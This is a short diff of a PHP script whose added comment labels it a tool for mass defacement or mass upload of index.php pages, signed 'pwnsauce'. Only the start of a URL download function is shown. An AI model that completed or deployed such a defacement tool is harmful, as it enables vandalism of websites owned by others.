@@ -1,5 +1,5 @@
 <?php
-
+// mass deface / mass upload index.php using url to get the index.php content by pwnsauce :)
 function downloadFile($url, $savePath) {
     $content = file_get_contents($url);
     if ($content === FALSE) {
